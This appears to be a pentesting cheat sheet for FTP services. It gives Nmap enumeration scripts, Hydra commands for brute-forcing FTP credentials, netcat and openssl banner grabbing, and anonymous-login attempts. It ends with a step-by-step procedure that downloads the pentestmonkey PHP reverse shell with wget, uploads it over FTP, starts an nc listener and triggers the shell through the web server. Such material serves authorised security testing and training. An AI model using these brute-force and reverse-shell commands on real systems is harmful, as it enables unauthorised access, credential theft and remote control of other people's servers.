---
title: File Transfer Protocol (FTP) Pentesting
desc: Default port is 21.
tags: [20, 21, FTP, Hydra, Netcat, Network, Nmap, Web]
alts: [Reverse-Shell]
render_with_liquid: false
---

## Enumeration

1. **Use Nmap**

    ```sh
    nmap --script ftp-anon -p 21 <target-ip>
    nmap --script ftp-vuln* -p 21 <target-ip>
    nmap --script ftp-* -p 21 <target-ip>
    ```

2. **Brute Force Credentials**

    ```sh
    hydra -l username -P passwords.txt <target-ip> ftp
    hydra -L username.txt -p password <target-ip> ftp

    hydra -l username -P passwords.txt ftp://<target-ip>
    hydra -L usernames.txt -p password ftp://<target-ip>
    ```

<br />

## Investigation

1. **Banner Grabbing**

    ```sh
    nc <target-ip> 21
    ```

    - **Use OpenSSL**

        First off, open listener.

        ```sh
        nc -vn <target-ip> 21
        ```

        Then run the command below.

        ```sh
        openssl s_client -connect <target-ip>:21 -starttls ftp
        ```

<br />

## Connect FTP

```sh
ftp username@10.0.0.1
```

Sometimes you might be able to the **anonymous** login.  
Not likely, but worth a try.

```
ftp 10.0.0.1 
username: anonymous
password: anonymous
```

<br />

## Search Files in FTP

1. **Basic Investigation**

    If you can connect FTP, search directories and files, then download them to your local machine.

    ```sh
    ftp> ls

    # Transfer files to the local machine.
    ftp> get sample.txt
    ```

<br />

## Reverse Shell over FTP

If the target website allows users to access the ftp directory, you can upload the exploit for the reverse shell and get a shell.  

1. **Download the Payload**

    Get the payload for the reverse shell from [this repository](https://github.com/pentestmonkey/php-reverse-shell){:target="_blank"}.

    ```sh
    wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php

    # Edit some variables
    $ip = '<your-local-ip>';
    $port = 1234;
    ```

2. **Upload the Payload to FTP Directory**

    Connect to FTP and upload.

    ```sh
    ftp username@<target-ip>

    # Upload the payload you downloaded
    ftp > put shell.php
    ```

3. **Get a Shell**

    At first, you need to open listener in your local machine.

    ```sh
    nc -lvnp 1234
    ```

    In a web browser, access to "http://vulnerable.com/path/to/ftp/shell.php".  
    You should get a target shell.